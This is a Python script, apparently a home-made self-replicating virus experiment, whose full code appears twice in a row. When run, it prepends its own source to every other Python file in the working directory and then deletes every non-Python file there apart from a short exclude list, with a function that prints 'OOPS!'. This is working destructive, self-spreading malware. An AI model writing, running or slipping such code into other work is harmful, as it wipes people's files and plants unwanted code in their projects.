import sys
import glob
import os

# directory path
dir_path = os.getcwd()

# list of files to exclude from deletion
exclude_files = [
    "code/self-replicatiing.py",
    "code/delete-nonpy.py",
    "/Users/ntiliak/Documents/Tutorials/Test Projects/vrus test/README.md",
]

# get list of Python files in the directory
python_files = glob.glob(os.path.join(dir_path, "*.py")) + glob.glob(
    os.path.join(dir_path, "*.pyw")
)

# read self-replicating code from this script up to "BYE!" line
code = []
with open(sys.argv[0], "r") as f:
    lines = f.readlines()
self_replicating_part = False
for line in lines:
    if line == "HI!\n":
        self_replicating_part = True
    if not self_replicating_part:
        code.append(line)
    if line == "BYE!\n":
        break

# iterate over the list of Python files
for file_path in python_files:
    # check if the file is not in the exclude list and doesn't already contain the self-replicating code
    if file_path not in exclude_files and "HI!\n" not in open(file_path).read():
        # inject self-replicating code into the file
        with open(file_path, "r+") as f:
            content = f.read()
            f.seek(0, 0)
            f.write("".join(code) + "\n" + content)

# get list of files in the directory
file_list = glob.glob(os.path.join(dir_path, "*"))

# iterate over the list of files
for file_path in file_list:
    # check if the file is not a Python file and is not in the exclude list
    if (
        os.path.isfile(file_path)
        and os.path.splitext(file_path)[1] not in (".py", ".pyw")
        and file_path not in exclude_files
    ):
        os.remove(file_path)
    else:
        pass


def bad_code():
    print("OOPS!")


bad_code()

import sys
import glob
import os

# directory path
dir_path = os.getcwd()

# list of files to exclude from deletion
exclude_files = [
    "code/self-replicatiing.py",
    "code/delete-nonpy.py",
    "/Users/ntiliak/Documents/Tutorials/Test Projects/vrus test/README.md",
]

# get list of Python files in the directory
python_files = glob.glob(os.path.join(dir_path, "*.py")) + glob.glob(
    os.path.join(dir_path, "*.pyw")
)

# read self-replicating code from this script up to "BYE!" line
code = []
with open(sys.argv[0], "r") as f:
    lines = f.readlines()
self_replicating_part = False
for line in lines:
    if line == "HI!\n":
        self_replicating_part = True
    if not self_replicating_part:
        code.append(line)
    if line == "BYE!\n":
        break

# iterate over the list of Python files
for file_path in python_files:
    # check if the file is not in the exclude list and doesn't already contain the self-replicating code
    if file_path not in exclude_files and "HI!\n" not in open(file_path).read():
        # inject self-replicating code into the file
        with open(file_path, "r+") as f:
            content = f.read()
            f.seek(0, 0)
            f.write("".join(code) + "\n" + content)

# get list of files in the directory
file_list = glob.glob(os.path.join(dir_path, "*"))

# iterate over the list of files
for file_path in file_list:
    # check if the file is not a Python file and is not in the exclude list
    if (
        os.path.isfile(file_path)
        and os.path.splitext(file_path)[1] not in (".py", ".pyw")
        and file_path not in exclude_files
    ):
        os.remove(file_path)
    else:
        pass


def bad_code():
    print("OOPS!")


bad_code()
